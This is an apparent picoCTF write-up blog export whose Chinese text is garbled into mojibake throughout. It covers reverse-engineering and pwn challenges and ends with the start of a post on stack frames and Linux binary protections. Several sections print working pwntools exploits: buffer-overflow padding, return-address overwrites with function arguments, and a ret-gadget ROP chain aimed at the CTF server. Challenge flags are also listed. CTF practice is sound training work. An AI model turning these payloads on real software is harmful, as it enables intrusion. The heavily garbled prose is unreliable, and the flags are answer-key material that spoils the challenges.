èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿ ä»¥ä¸‹æ˜¯è¯•ç”¨è¯´æ˜ï¼š 123456$ chmod +x gdbme$ gdb gdbme(gdb) layout asm(gdb) break *(main+99)(gdb) run(gdb) jump *(main+104) è§£å¯† æŒ‰ç…§ç»™çš„å‘½ä»¤è¿›è¡Œæ“ä½œ flag: picoCTF{d3bugg3r_dr1v3_7776d758} fresh-javaé¢˜ç›®ä¿¡æ¯ ä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿå¯¹è¿™ä¸ª Java ç¨‹åºè¿›è¡Œé€†å‘å·¥ç¨‹ ç”¨jad-guiæ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°è¯¥å¯†æ–‡å·²å°†è¢«å®šä¹‰å¥½äº† flagï¼špicoCTF{700l1ng_r3qu1r3d_738cac89} file-run1é¢˜ç›®ä¿¡æ¯ å·²ä¸ºæ‚¨æä¾›ä¸€ä¸ªç¨‹åºï¼Œå¦‚æœæ‚¨å°è¯•åœ¨å‘½ä»¤è¡Œä¸Šè¿è¡Œå®ƒä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ è§£å¯† é¦–å…ˆè¦ä¸ºç¨‹åºèµ‹æƒé™ chmod +x ru è¿è¡Œè¯¥ç¨‹åºå¹¶ä¸”æ‰§è¡Œå‘½ä»¤.&#x2F;run flag:picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b} file-run2é¢˜ç›®ä¿¡æ¯ å¦ä¸€ä¸ªç¨‹åºï¼Œä½†è¿™ä¸€æ¬¡ï¼Œå®ƒä¼¼ä¹éœ€è¦ä¸€äº›è¾“å…¥ã€‚å¦‚æœæ‚¨å°è¯•åœ¨å‘½ä»¤è¡Œä¸Šè¿è¡Œå®ƒå¹¶è¾“å…¥ â€œHelloï¼â€ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿ è§£å¯† é¦–å…ˆè¦ä¸ºç¨‹åºèµ‹æƒé™ chmod +x ru è¿è¡Œè¯¥ç¨‹åºå¹¶ä¸”æ‰§è¡Œå‘½ä»¤.&#x2F;run Hello! flag:picoCTF{F1r57_4rgum3n7_f65ed63e} Bbbbloaté¢˜ç›®ä¿¡æ¯ ä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿå¯¹è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œé€†å‘å·¥ç¨‹ã€‚ è§£å¯† åˆ†æå¾—åˆ°ï¼Œæœ€å–œæ¬¢çš„æ˜¯æ•°å­—åº”è¯¥ä¸º549255 ä¸ºæ–‡ä»¶èµ‹æƒé™ chmod +x Bbbbloat è¿è¡Œç¨‹åº./Bbbbloat flagï¼špicoCTF{cu7_7h3_bl047_44f74a60} unpackmeé¢˜ç›®æè¿° ä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿå¯¹è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œé€†å‘å·¥ç¨‹ã€‚ è§£å¯† æ–‡ä»¶ä»¥upxç»“å°¾ï¼Œå°è¯•upxè„±å£³ ä¹‹åæ‹–å…¥idaä¸­ å‘ç°æœ€å–œçˆ±çš„æ•°å­—æ˜¯754635 flag: picoCTF{up&gt;&lt;_m3_f7w_e510a27f} PWNRPSé¢˜ç›®æè¿° è¿™æ˜¯ä¸€ä¸ªå¯¹ä½ ç©çŸ³å¤´å‰ªåˆ€å¸ƒçš„ç¨‹åºã€‚æˆ‘å¬è¯´å¦‚æœä½ è¿ç»­èµ¢äº† 5 æ¬¡ï¼Œå°±ä¼šå‘ç”Ÿå¥½äº‹ã€‚å¯ä»¥ä¸‹è½½å¸¦æœ‰æ ‡è®°å·²ç¼–è¾‘çš„ç¨‹åºæºä»£ç  è¿™é‡Œ ã€‚ è§£å¯† ä¸»å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int main () &#123; char input[3] = &#123;&#x27;\\0&#x27;&#125;; int command; int r; puts(&quot;Welcome challenger to the game of Rock, Paper, Scissors&quot;); puts(&quot;For anyone that beats me 5 times in a row, I will offer up a flag I found&quot;); puts(&quot;Are you ready?&quot;); while (true) &#123; puts(&quot;Type &#x27;1&#x27; to play a game&quot;); puts(&quot;Type &#x27;2&#x27; to exit the program&quot;); r = tgetinput(input, 3); // Timeout on user input if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; //å‰é¢é‚£äº›éƒ½ä¸é‡è¦ if ((command = strtol(input, NULL, 10)) == 0) &#123; puts(&quot;Please put in a valid number&quot;); &#125; else if (command == 1) &#123; printf(&quot;\\n\\n&quot;); if (play()) &#123; wins++; &#125; else &#123; wins = 0; &#125; if (wins &gt;= 5) &#123; puts(&quot;Congrats, here&#x27;s the flag!&quot;); puts(flag); &#125; &#125; else if (command == 2) &#123; return 0; &#125; else &#123; puts(&quot;Please type either 1 or 2&quot;); &#125; &#125; return 0;&#125; åˆ¤æ–­èƒœè´Ÿ 1234567891011121314151617181920212223242526//åˆ¤æ–­èƒœè´Ÿbool play () &#123; char player_turn[100]; srand(time(0));//ç”µè„‘çš„å‡ºæ‹³è®¾è®¡ int r; printf(&quot;Please make your selection (rock/paper/scissors):\\n&quot;);//æ ¡éªŒ r = tgetinput(player_turn, 100); if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; int computer_turn = rand() % 3;//ç¡®ä¿åœ¨3ä¸ªæ‰‹åŠ¿ä¸­éšæœºé€‰æ‹©ä¸€ä¸ª printf(&quot;You played: %s\\n&quot;, player_turn); printf(&quot;The computer played: %s\\n&quot;, hands[computer_turn]); if (strstr(player_turn, loses[computer_turn])) &#123;//æ ¸éªŒæˆ‘ä»¬æ‰€å‡ºçš„æ˜¯å¦åŒ…å«èƒœåˆ©æ‰€éœ€è¦åº•è‰²é‚£ä¸ªæ‰‹åŠ¿ puts(&quot;You win! Play again?&quot;); return true; &#125; else &#123; puts(&quot;Seems like you didn&#x27;t win this time. Play again?&quot;); return false; &#125;&#125; æ‰€ä»¥æˆ‘ä»¬è¦ç»è¿‡5æ¬¡å¾ªç¯ï¼Œä¸”æ¯æ¬¡å¾ªç¯éƒ½è¦å‘ç¨‹åºè¾“å‡ºrock&#x2F;paper&#x2F;scissorsçš„ç»“åˆ è„šæœ¬12345678from pwn import *p = remote(&#x27;saturn.picoctf.net&#x27;, 60179)for i in range(5): p.sendline(b&#x27;1&#x27;) p.sendline(b&#x27;rock/paper/scissors&#x27;)print(p.recvline_contains(b&#x27;picoCTF&#123;&#x27;)) basic-file-exploit æ¼æ´é¢˜ç›®ä¿¡æ¯ æä¾›çš„ç¨‹åºå…è®¸æ‚¨å†™å…¥æ–‡ä»¶å¹¶ä»ä¸­è¯»å–æ‚¨å†™å…¥çš„å†…å®¹ã€‚è¯•ç€ç©å¼„å®ƒï¼Œçœ‹çœ‹ä½ æ˜¯å¦èƒ½æ‰“ç ´å®ƒï¼å¯ä»¥ä¸‹è½½å¸¦æœ‰æ ‡è®°å·²ç¼–è¾‘çš„ç¨‹åºæºä»£ç  è¿™é‡Œ è§£å¯† æœ‰åˆ†æå¯å¾—tgetinputç”¨æ¥æ ¡éªŒç©ºè¾“å…¥ç­‰åŸºæœ¬æ ¡éªŒå·¥ä½œï¼Œdata_writeæ•°æ®è¾“å…¥ï¼Œdata_readæ•°æ®è¯»å–ï¼Œä¸”å…¶ä¸­åŒ…å«flagçš„è¾“å‡º ç”±mainå¯ä»¥çŸ¥é“ã€‚é¦–å…ˆé€‰æ‹©è¦è¿›è¡Œçš„æ¨¡å¼ï¼Œä¸”ç¬¬ä¸€æ¬¡å¿…é¡»å…ˆå­˜å…¥ï¼Œå¦åˆ™æ— æ³•è°ƒç”¨data_readå‡½æ•° 123456789101112131415161718192021222324252627static void data_read() &#123; char entry[4]; long entry_number; char output[100]; int r; memset(output, &#x27;\\0&#x27;, 100); printf(&quot;Please enter the entry number of your data:\\n&quot;); r = tgetinput(entry, 4); // Timeout on user input if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; if ((entry_number = strtol(entry, NULL, 10)) == 0) &#123;//å°è¯•å°† entry å­—ç¬¦ä¸²çš„å¼€å¤´éƒ¨åˆ†è§£ææˆä¸€ä¸ªåè¿›åˆ¶çš„é•¿æ•´å‹æ•°å€¼ï¼Œ puts(flag); fseek(stdin, 0, SEEK_END); exit(0); &#125; entry_number--; strncpy(output, data[entry_number], input_lengths[entry_number]); puts(output);&#125; æ‰€ä»¥é‡ç‚¹å°±æ˜¯((entry_number = strtol(entry, NULL, 10)) == 0)çš„è¾“å‡ºç»“æœä¸º0 flag:picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F} buffer overflow 0é¢˜ç›®ä¿¡æ¯ è®©æˆ‘ä»¬ä»ç®€å•çš„å¼€å§‹ï¼Œä½ èƒ½æº¢å‡ºæ­£ç¡®çš„ç¼“å†²åŒºå—ï¼Ÿè¯¥ç¨‹åºå¯åœ¨æ­¤å¤„è·å¾—ã€‚æ‚¨å¯ä»¥æŸ¥çœ‹æºä»£ç  è¿™é‡Œ ã€‚ è§£å¯† ä¸»å‡½æ•° signal(11, sigsegv_handler)å½“ç¨‹åºå‘ç”Ÿæ®µé”™è¯¯ï¼ˆå³æ”¶åˆ°ä¿¡å· 11ï¼Œä¹Ÿå°±æ˜¯ SIGSEGVï¼‰æ—¶ï¼Œä¸æ‰§è¡Œé»˜è®¤æ“ä½œï¼ˆå´©æºƒï¼‰ï¼Œè€Œæ˜¯è·³è½¬åˆ°ä½ å®šä¹‰çš„ sigsegv_handler å‡½æ•°è¿›è¡Œå¤„ç†ã€‚ å½“ä½ çš„ç¨‹åºè¯•å›¾è®¿é—®éæ³•å†…å­˜åœ°å€ï¼ˆå¦‚æœªåˆ†é…çš„å†…å­˜ã€åªè¯»å†…å­˜ã€å·²é‡Šæ”¾çš„å†…å­˜ç­‰ï¼‰æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå‘é€è¿™ä¸ªä¿¡å·ç»™ç¨‹åºã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ”¶åˆ° SIGSEGV ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼ˆæ®µé”™è¯¯ï¼‰ã€‚ ç¤ºä¾‹è§¦å‘åŸå› ï¼š è§£å¼•ç”¨ç©ºæŒ‡é’ˆï¼š*NULL å†™å…¥å¸¸é‡å­—ç¬¦ä¸²ï¼šstrcpy(&quot;hello&quot;, &quot;world&quot;) è¶Šç•Œè®¿é—®æ ˆæ•°ç»„ã€å †æ•°ç»„ ä½¿ç”¨æœªåˆå§‹åŒ–çš„æŒ‡é’ˆ è¿™ä¸ªå¯¹flag.txtæ–‡ä»¶çš„æ“ä½œ ç›¸å½“äºbin&#x2F;shåé—¨å‡½æ•° å®ƒåŒ…å«äº†è¯»å–flag,å¹¶æŠŠflagè¾“å‡ºåœ¨ç»ˆç«¯ è€Œåœ¨ Linux&#x2F;Unix ç³»ç»Ÿä¸­ï¼Œ/bin/sh æ˜¯ä¸€ä¸ªæŒ‡å‘ç³»ç»Ÿé»˜è®¤ shellï¼ˆå¦‚ Bashï¼‰çš„å¯æ‰§è¡Œæ–‡ä»¶ sigsegv_handlerå‡½æ•° è¯¥å‡½æ•°ä¼šè¾“å‡ºflag æ‰€ä»¥åªéœ€è¦å®ç°å°±å¯ä»¥è¾“å‡ºflag è„šæœ¬1234from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 62318)p.sendline(b&#x27;a&#x27;*20)p.interactive() buffer overflow 1é¢˜ç›®æè¿° æ§åˆ¶é€€è´§åœ°å€ç°åœ¨æˆ‘ä»¬å¼€å§‹çƒ¹é¥ªäº†ï¼æ‚¨å¯ä»¥æº¢å‡ºç¼“å†²åŒºå¹¶è¿”å›åˆ°ç¨‹åºä¸­çš„ flag å‡½æ•°ã€‚ä½ å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹æºä»£ç ã€‚ è§£å¯† var_4 æ˜¯ä»€ä¹ˆï¼Ÿ åœ¨æ±‡ç¼–æˆ–åç¼–è¯‘å·¥å…·ï¼ˆå¦‚ IDA Proï¼‰ä¸­ï¼Œvar_4 æ˜¯ä¸€ä¸ªç”±å·¥å…·è‡ªåŠ¨ç”Ÿæˆçš„åç§°ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªä½äºæ ˆä¸Šçš„å±€éƒ¨å˜é‡ã€‚å®ƒé€šå¸¸æ˜¯åŸå§‹Cä»£ç ä¸­æ²¡æœ‰æ˜ç¡®å‘½åçš„å˜é‡ï¼Œæˆ–è€…æ˜¯ç¼–è¯‘å™¨ä¸ºäº†ä¼˜åŒ–æˆ–å†…éƒ¨ä½¿ç”¨è€Œåˆ›å»ºçš„æ ˆç©ºé—´ã€‚ ä»å›¾ç‰‡ä¸­å¯ä»¥çœ‹åˆ°ï¼Œvar_4 ä½äº s æ•°ç»„çš„ä¸‹æ–¹ï¼ˆåœ¨æ ˆå¸§ä¸­ï¼Œå±€éƒ¨å˜é‡é€šå¸¸ä» EBP å¾€ä¸‹åˆ†é…ï¼‰ã€‚ var_4 æœ‰å¤šå¤§ï¼Ÿ å›¾ç‰‡ä¸­ var_4 å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤æ˜¯ dd ?ã€‚ dd åœ¨æ±‡ç¼–ä¸­æ˜¯ â€œDefine Doublewordâ€ çš„ç¼©å†™ã€‚åœ¨ 32 ä½ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ª Doubleword æ˜¯ 4 å­—èŠ‚ã€‚ å› æ­¤ï¼Œvar_4 çš„å¤§å°æ˜¯ 4 å­—èŠ‚ã€‚ æ‰€ä»¥åƒåœ¾å­—èŠ‚è¦å¡«å……36+4+4&#x3D;44ä¸ªå­—èŠ‚ winæ˜¯åé—¨å‡½æ•° å¡«å……å®ƒçš„åœ°å€ è„šæœ¬1234from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 59895)p.sendline(b&#x27;a&#x27;*44+p32(0x080491F6))p.interactive() buffer overflow 2é¢˜ç›®æè¿° æ§åˆ¶è¿”å›åœ°å€å’Œå‚æ•°è¿™ä¸€æ¬¡ï¼Œæ‚¨éœ€è¦æ§åˆ¶æ‚¨è¿”å›çš„å‡½æ•°çš„å‚æ•°ï¼æ‚¨å¯ä»¥ä»æ­¤ç¨‹åºä¸­è·å–æ ‡å¿—å—ï¼Ÿä½ å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹æºä»£ç  è§£å¯† sè·ç¦»è¿”å›åœ°å€æ˜¯6C+4ä¸ªå­—èŠ‚ è¦ä¼ å‚ï¼Œ32ä½æ˜¯å‚æ•°ä»å³åˆ°å·¦ä¾æ¬¡å‹å…¥æ ˆä¸­ winçš„åœ°å€ gdbåŠ¨è°ƒæŸ¥çœ‹python wp.py æ‰§è¡Œçš„å‡½æ•°åˆ—è¡¨ è„šæœ¬1234567891011from pwn import *# æœ¬åœ°# ex = process(&#x27;./vuln&#x27;)# è¿œç¨‹p = remote(&#x27;saturn.picoctf.net&#x27;, 62974)payload = b&#x27;a&#x27;*112+p32(0x08049296)+p32(0)+p32(0xCAFEF00D)+p32(0xF00DF00D)p.sendline(payload)# p.interprint(p.recvall()) x-sixty-whaté¢˜ç›®æè¿° æº¢å‡º x64 ä»£ç åœ¨æ­¤ä¹‹å‰çš„å¤§å¤šæ•°é—®é¢˜æ˜¯ 32 ä½ x86ã€‚ç°åœ¨æˆ‘ä»¬è€ƒè™‘ 64 ä½ x86ï¼Œå®ƒ åªæ˜¯æœ‰ç‚¹ä¸åŒï¼ä½¿ç¼“å†²åŒºæº¢å‡ºï¼Œå¹¶å°†è¿”å›åœ°å€æ›´æ”¹ä¸º flag å‡½æ•°ã€‚ ä¸‹è½½æºä»£ç  ã€‚ è§£å¯† è¿™ä¸€é¢˜æˆ‘é”™äº†å¾ˆä¹…ï¼Œæœ€åå‘ç°è€ƒäº†å †æ ˆå¹³è¡¡:crying_cat_face: ä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸€äº›gdbè°ƒè¯•è·å–ä¿¡æ¯çš„æ–¹æ³• gdbè°ƒè¯•è·å¾—ç›¸å…³ä¿¡æ¯ readelf -s vulnæ˜¾ç¤ºæ‰€æœ‰å‡½æ•°çš„ä¿¡æ¯ï¼ˆåœ¨gdbè°ƒè¯•ä¹‹å‰ï¼‰ p flagï¼šæ˜¾ç¤ºå‡½æ•°flagçš„ä¿¡æ¯ ï¼ˆgdbï¼‰disassemble vulnï¼šæ‰¾è¦å¡«å……çš„å­—èŠ‚æ•°ï¼ˆï¼‰ 64ä½æ—¶æ˜¯0x40+8 32ä½æ—¶æ˜¯0x40+4 å †æ ˆå¹³è¡¡åŒä¸€ä¸ªç¨‹åºçš„æ¯ä¸€ä¸ª call æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œrspï¼ˆæ ˆæŒ‡é’ˆï¼‰çš„ç»å¯¹å€¼ä¸ä¸€å®šç›¸åŒï¼Œä½†å…¶å¯¹é½çŠ¶æ€æ˜¯ä¿æŒä¸€è‡´çš„ã€‚ å½“ vuln å‡½æ•°é€šè¿‡ ret æŒ‡ä»¤è·³è½¬åˆ° flag å‡½æ•°æ—¶ï¼Œflag å‡½æ•°çš„å…¥å£å¤„ rsp (æ ˆæŒ‡é’ˆ) å¯èƒ½æ»¡è¶³ rsp % 16 == 0 (å³ 16 å­—èŠ‚å¯¹é½)ã€‚ä½†æ˜¯ï¼Œflag å‡½æ•°çš„åºè¨€ (prologue) é€šå¸¸ä¼š push rbp (å°† rbp å‹æ ˆ)ï¼Œè¿™ä¼šä½¿ rsp å‡å» 8 å­—èŠ‚ï¼Œå¯¼è‡´ rsp % 16 == 8 (8 å­—èŠ‚ä¸å¯¹é½)ã€‚ é—®é¢˜å°±å‡ºåœ¨è¿™é‡Œï¼šåœ¨æ‰§è¡Œä»»ä½• call æŒ‡ä»¤ä¹‹å‰ï¼Œrsp å¿…é¡»æ˜¯ 16 å­—èŠ‚å¯¹é½çš„ã€‚ æ‰€ä»¥è¯¥å‡½æ•°åˆ°flagä¹‹å‰è¦å…ˆåˆ°retå°å·¥å…· ä½¿ç”¨ ROPgadget (æ¨è)ï¼š åœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼ˆç¡®ä¿ä½ çš„ vuln å¯æ‰§è¡Œæ–‡ä»¶åœ¨å½“å‰ç›®å½•ï¼‰ï¼š Bash 1ROPgadget --binary ./vuln --only &quot;ret&quot; å®ƒä¼šåˆ—å‡ºæ‰€æœ‰ç‹¬ç«‹çš„ ret æŒ‡ä»¤åœ°å€ã€‚é€šå¸¸ä½ å¯ä»¥é€‰æ‹©å…¶ä¸­ä¸€ä¸ªåœ°å€æœ€å°çš„ï¼Œæˆ–è€…ä½ è§‰å¾—â€œç‹¬ç«‹â€çš„åœ°å€ï¼ˆä¾‹å¦‚ï¼Œä¸åœ¨ä»»ä½•é‡è¦å‡½æ•°çš„ä¸­é—´ï¼‰ã€‚0x0040101a æ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„å¤‡é€‰ã€‚ åœ¨ GDB&#x2F;pwndbg ä¸­æ‰‹åŠ¨æŸ¥æ‰¾ï¼š å¯åŠ¨ GDB è°ƒè¯• ./vulnï¼Œç„¶åä½¿ç”¨ search-pattern å‘½ä»¤æŸ¥æ‰¾ ret æŒ‡ä»¤çš„æœºå™¨ç  \\xc3ï¼š Code snippet 1search-pattern &#x27;\\xc3&#x27; ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ disassemble &lt;section_start_address&gt;, &lt;section_end_address&gt; æ¥åæ±‡ç¼–æ•´ä¸ªä»£ç æ®µï¼Œç„¶åæ‰‹åŠ¨æŸ¥æ‰¾ retã€‚ ç›´æ¥çœ‹å‡ºå †æ ˆä¸å¹³è¡¡ è¯¥å‡½æ•°æ˜¯flagè¢«è°ƒç”¨å‡½æ•°è¾“å‡ºflagï¼Œæ‰€ä»¥åœ¨flagå‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ªcallçš„åœ°æ–¹ä¸‹æ–­ç‚¹ python ä½ çš„è„šæœ¬æ–‡ä»¶å.pyï¼šè¿è¡Œè„šæœ¬ info registers rspï¼šæŸ¥çœ‹rspçš„å¯„å­˜å™¨ä¿¡æ¯ çœ‹æœ€åä¸¤ä½ 0x48å¯ä»¥æ•´é™¤16ï¼Œæ‰€ä»¥ç°åœ¨å †æ ˆå¹³è¡¡äº† è„šæœ¬12345678910111213141516171819from pwn import *# p = process(&#x27;./vuln&#x27;)# gdb.attach(p, gdbscript=&#x27;b *0x08049370\\ncontinue&#x27;)p = remote(&quot;saturn.picoctf.net&quot;, 50442)# ä¹‹å‰æ‰¾åˆ°çš„ flag å‡½æ•°åœ°å€flag_address = 0x00401236 # åœ¨ä½ çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°ä¸€ä¸ª ret å°å·¥å…·çš„åœ°å€# å‡è®¾ä½ æ‰¾åˆ°çš„æ˜¯ 0x0040101aï¼Œè¯·æ›¿æ¢ä¸ºä½ åœ¨ GDB/ROPgadget ä¸­æ‰¾åˆ°çš„å®é™…åœ°å€ret_gadget_address = 0x0040101a # æ„å»º payloadï¼šå¡«å…… + ret_gadget_address + flag_addresspayload = b&#x27;A&#x27; * (0x40 + 8) + p64(ret_gadget_address) + p64(flag_address)p.sendline(payload)print(p.recvall())","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"åˆè¯†æ ˆæº¢å‡º","slug":"åˆè¯†æ ˆæº¢å‡º","date":"2025-07-05T04:06:13.000Z","updated":"2025-09-02T09:19:16.069Z","comments":true,"path":"2025/07/05/åˆè¯†æ ˆæº¢å‡º/","permalink":"http://example.com/2025/07/05/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"fun(a,b)è°ƒç”¨è¿‡ç¨‹å…¥æ ˆ ï¼ˆ1ï¼‰å‹å…¥å‚æ•° æ ¹æ®è°ƒç”¨çº¦å®šï¼Œmainå‡½æ•°ä½œä¸ºè°ƒç”¨è€…ï¼Œé¦–å…ˆéœ€è¦å°†funcå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°a,bå‹å…¥æ ˆä¸­ã€‚ æ³¨æ„å‹å…¥å‚æ•°çš„é¡ºåºï¼Œé¦–å…ˆå‹å…¥bï¼Œæ¥ç€å‹å…¥aï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå‹å…¥å‚æ•°çš„é¡ºåºæ˜¯ä»å³åˆ°å·¦ã€‚ ï¼ˆ2ï¼‰è¿”å›åœ°å€å‹æ ˆ è¿”å›åœ°å€å‹æ ˆã€‚mainå‡½æ•°ä¸ºäº†è®©funcå‡½æ•°è°ƒç”¨åæ­£å¸¸è¿”å›ï¼Œéœ€è¦å°†å½“å‰æŒ‡ä»¤ï¼ˆcallæŒ‡ä»¤ï¼‰çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹å…¥æ ˆä¸­ callæŒ‡ä»¤åŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼šmainå‡½æ•°çš„ä¸‹ä¸€æ¡æŒ‡ä»¤å‹æ ˆï¼›æ§åˆ¶eipä¸ºfuncå‡½æ•°çš„ç¬¬ä¸€æ¡è¯­å¥ï¼Œeipå­˜å‚¨ç€CPUå°†è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ ï¼ˆ3ï¼‰funcå‡½æ•°è¿è¡Œ funcå‡½æ•°éœ€è¦è‡ªå·±çš„å†…éƒ¨è¿ä½œç©ºé—´ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤åºåˆ—å¼€è¾Ÿç©ºé—´ï¼špush ebp mov ebp,esp sub esp,28h è¿™ä¸ª28hå°±æ˜¯å¼€è¾Ÿçš„å­˜å‚¨funcå‡½æ•°çš„ç›¸å…³å†…å­˜çš„ç©ºé—´ mov ebp,espçœ‹ä¼¼æ²¡æœ‰å˜åŒ–ï¼Œä½†EBP ä»â€œä¿å­˜è°ƒç”¨è€…åŸºå€â€å˜ä¸ºâ€œå½“å‰å‡½æ•°çš„æ ˆå¸§åŸºå€â€ã€‚ ï¼ˆ4ï¼‰funcå‡½æ•°çš„å±€éƒ¨å˜é‡å’Œå‚æ•° funcå‡½æ•°æœ‰è‡ªå·±å†…éƒ¨çš„è¿ä½œç©ºé—´ï¼Œå³func_ebpåˆ°func_esp å±€éƒ¨å˜é‡åœ¨ç¼–è¯‘ä¹‹åä¼šè¢«è¡¨ç¤ºä¸ºä¸ebp ä¸åŒçš„è·ç¦» v2è¢«è¡¨ç¤ºä¸ºebp -18hï¼Œv3è¢«è¡¨ç¤ºä¸ºebp -10hã€‚ æ³¨æ„ï¼Œè¿™é‡Œçš„v2, v3å’Œv4éƒ½æ˜¯å±€éƒ¨å˜é‡ã€‚å‚æ•°çš„è¯»å–æ–¹å¼ä¾‹å­:ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ebp+8ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ebp+12 å› ä¸ºè°ƒç”¨çº¦å®šï¼Œè‚¯å®šæœ‰main_nextå’Œmain_ebpåœ¨ebpçš„ä¸Šæ–¹ï¼Œæ•…åç§»æ˜¯å›ºå®šçš„ï¼Œåœ¨è¿”å›åœ°å€main_nextä¸Šé¢ ç„¶åï¼Œfuncå‡½æ•°è¿”å›ã€‚ä¸¤ä¸ªæ­¥éª¤ï¼šæ¸…é™¤æ ˆç©ºé—´ï¼Œè¿”å›åˆ°ä¹‹å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆmain_nextï¼‰å¤„ã€‚ (5)funcå‡½æ•°è¿”å›æ­¥éª¤1:æ¸…é™¤æ ˆç©ºé—´ æ¯ä¸ªå‡½æ•°æ¸…é™¤æ ˆç©ºé—´æ—¶å¯ä»¥ä½¿ç”¨ä¸€æ¡å…¬ç”¨æŒ‡ä»¤leaveã€‚ leaveåŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼š â‘ mov esp,ebpå°†æ ˆé¡¶è®¾ç½®ä¸ºæ ˆåŸºï¼Œå³å°†func_ebpåˆ°func_espçš„å†…å®¹å…¨éƒ¨å‡ºæ ˆï¼› â‘¡pop ebp å°†main_ebpçš„å†…å®¹é‡æ–°å¼¹å›ebpï¼Œä½¿mainå‡½æ•°çš„æ ˆåŸºå€å¾—åˆ°æ¢å¤ (6)funcå‡½æ•°è¿”å›æ­¥éª¤2ï¼šè¿”å›ä¹‹å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆmain_nextï¼‰å¤„ æ¯ä¸ªå‡½æ•°è¿”å›æ—¶å¯ä»¥ä½¿ç”¨ä¸€æ¡å…¬ç”¨æŒ‡ä»¤retã€‚retåŒ…å«ä¸€ä¸ªæ­¥éª¤ï¼šå°†æ ˆé¡¶å¼¹å‡ºåˆ°eipå¯„å­˜å™¨ï¼ˆå³ä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ï¼‰ï¼Œè¾¾åˆ°æ¢å¤mainå‡½æ•°æ‰§è¡Œé¡ºåºçš„ ç›®çš„ã€‚ åˆ°è¿™é‡Œï¼Œmainå‡½æ•°çš„æ ˆåŸºå€å’Œä¸‹ä¸€æ¡æŒ‡ä»¤éƒ½å¾—åˆ°äº†æ¢å¤ï¼Œä¹Ÿå°±å®Œæˆäº†æ•´ä¸ªfuncå‡½æ•°çš„è°ƒç”¨ã€‚ Linuxæ“ä½œç³»ç»Ÿçš„ä¿æŠ¤ Arch:amd64-64-littleï¼š amd64å³x86_64(CPUæ¶æ„) 64å³å­—é•¿ä¸º64ï¼Œè¿”å›åœ°å€åœ¨æ ˆä¸­å  8å­—èŠ‚ï¼Œ32ä½æ˜¯4å­—èŠ‚ï¼‰ littleè¡¨ç¤ºå°ç«¯åºï¼Œå¦‚æœæ˜¯bigåˆ™è¡¨ç¤ºå¤§ç«¯åºã€‚ä»¥æ•°å­—0x12345678ä¸ºä¾‹ï¼Œå°ç«¯åºå­˜å‚¨çš„æ˜¯\\x78\\x56\\x34\\x12ï¼Œå¤§ç«¯åºå­˜å‚¨çš„æ˜¯\\x12\\x34\\x56\\x78 RELROï¼šPartial RELRO: Partial RELROå’ŒFull RELROçš„åŒºåˆ«å¯ä»¥ç®€å•ç†è§£ä¸ºGOTå†™æƒé™çš„åŒºåˆ«ï¼ŒPartial RELROç›¸å½“äºGOTå¯å†™ï¼ŒFull RELROç›¸å½“äºGOTä¸å¯å†™ã€‚ NXï¼šNX enabled: å¦‚æœå¼€å¯äº†NXä¿æŠ¤æœºåˆ¶ï¼Œé‚£ä¹ˆwæƒé™å’Œxæƒé™å°±æ˜¯äº’æ–¥çš„,å³ä¸å­˜åœ¨æ—¢æ‹¥æœ‰å†™æƒé™åˆæ‹¥æœ‰æ‰§è¡Œæƒé™çš„æ®µã€‚è¿™ä¸ªä¿æŠ¤æœºåˆ¶æ˜¯ç”¨æ¥é˜²æ­¢shellcodeæ¤å…¥çš„ã€‚åœ¨gdbè°ƒè¯•ä¸­ï¼Œå¯ä»¥é€šè¿‡vmmapå‘½ä»¤æ¥æŸ¥çœ‹æ¯ä¸ªæ®µçš„æƒé™ã€‚ PIEï¼šNo PIEï¼ˆ0x8048000ï¼‰ 